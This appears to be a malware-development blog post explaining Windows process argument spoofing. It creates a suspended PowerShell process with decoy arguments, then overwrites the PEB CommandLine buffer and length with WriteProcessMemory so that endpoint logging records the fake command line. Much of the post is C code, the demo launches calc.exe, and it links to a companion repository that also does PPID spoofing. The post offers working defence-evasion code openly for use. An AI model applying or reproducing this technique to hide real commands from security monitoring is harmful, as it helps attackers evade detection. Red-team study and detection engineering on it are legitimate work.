---
description: powershell.exe -c echo "I am safe :)"
---

# Process Argument Spoofing

## Theory

First we create a process in suspended state with fake arguments (this should be at least as long as the actual argument we want to run), then we get its PEB and update the `ProcessParamters` structure in it, specifically the `CommandLine.Buffer` & `CommandLine.Length`, after which we will resume the process, and it will execute our actual argument. This helps us bypass vendors that log what the arguments are given to the process as we update the argument after it has been created.

## Argument Spoofing

First we will create a process in suspended state. Note that we would have to give the fake arguments to this suspended process. We can give the arguments through the `CreateProcess` api.

{% code fullWidth="false" %}
```c
LPSTR fakeArgs = "powershell.exe -c Write-Host 'Args faked ?'"; 
CreateProcessA(NULL, fakeArgs, NULL, NULL, FALSE, (CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT), NULL, "C:\\Windows\\System32", &si_ex.StartupInfo, &pi)) 
```
{% endcode %}

> <mark style="color:orange;">An</mark> <mark style="color:orange;"></mark><mark style="color:orange;">**Importante**</mark> <mark style="color:orange;"></mark><mark style="color:orange;">thing to note here is that the fake arguments should almost always be ≥ the real arguments. This is because whenever a process is created, there is limited memory allocated to the</mark> `CommandLine.Buffer`<mark style="color:orange;">. If the Actual args are greater than the fake ones, you might</mark> <mark style="color:orange;"></mark><mark style="color:orange;">**overwrite the buffer**</mark> <mark style="color:orange;"></mark><mark style="color:orange;">and crash the process.</mark>

Then we just need to get to the PEB of that process, and from there we will get to the `ProcessParameters` structure and eventually the `CommandLine.Buffer` & `CommandLine.Length`.

{% code overflow="wrap" %}
```c
STATUS = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &dwRet)

pPEB = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, (PVOID*)pPEB, sizeof(PEB), &szBytes)

pParams = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS));
ReadProcessMemory(pi.hProcess, pPEB->ProcessParameters, pParams, sizeof(RTL_USER_PROCESS_PARAMETERS), &szBytes)
```
{% endcode %}

Now we have read the `ProcessParameters` structure, we just need to get the `CommandLine.Buffer`. This is at the offset of `0x70` from it.

<pre class="language-c" data-overflow="wrap"><code class="lang-c">// We need to convert it to UNICODE, that's just how Windows work internally
LPSTR faikArgs = "powershell.exe -c Write-Host 'Args faked ?'"; 
LPCWSTR RealArgs = L"powershell.exe -NoExit calc.exe";

WCHAR spoofed[MAX_PATH];
wcscpy_s(spoofed, MAX_PATH, RealArgs);
WriteProcessMemory(pi.hProcess, (PVOID)pParams->CommandLine.Buffer, (PVOID)spoofed, (wcslen(spoofed) + 1) * sizeof(WCHAR), &#x26;szBytes)

//DWORD dwCorrectLength = strlen(faikArgs);
// sizeof(faikArgs) = 8 , idk why it was acting weird when I hardcoded 10, 
// it was showing full length in process hacker
// It's best to use unicode for both fake &#x26; real args
// I'll update on this weird behavior later after more testing &#x26; searching
// This below did only print till "powershell.exe" , since * 2 gives ~ unicode length
DWORD dwCorrectLength = 28;

<strong>LPVOID lpCmdLength = (PBYTE)pPEB->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length);
</strong>WriteProcessMemory(pi.hProcess, lpCmdLength, &#x26;dwCorrectLength, sizeof(DWORD), &#x26;szBytes)
</code></pre>

And that's it, we have updated the command line with the actual one, and also the length as well. If I know look at it through  process hacker, I see only till the powershell.exe, and it spawns a calc.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Seeing the fake args, before it has been updated </p></figcaption></figure>



> For some reason, I had troubles with reading the Command Line, if I look at it before my code updates it, it stays the same no matter the length I give in Process Hacker. But doing the same behavior in Process Explorer doesn't lead to similar results, I actually see the updated command line.

I did some debugging and first thought that Process Hacker looks at the Parameters once (when we look at the properties), but it seems that I was wrong (weird because it was working earlier?) but my only guess is that maybe it looks at them once at the time of creation of process, which explains why it just doesn't update. Whereas, Process Explorer may query and get the Process Parameters everytime I look at the properties, which is always the better approach.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>Process Explorer showing the updated command line</p></figcaption></figure>

The calc.exe dies soon and another calculatorapp process spawns, but if we look at it (calc.exe) quickly, we can see that its PPID is the powershell we created.&#x20;

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Thank you.

I'll update more details later (after some more testing). For now, I have the full code which includes the PPID Spoofing as well, on my [github](https://github.com/ZzN1NJ4/Malware-Development/tree/main/MorphExe) so you can check that out if you want. I'm thinking to write more in Rust so maybe in my next post, I will be using Rust.&#x20;
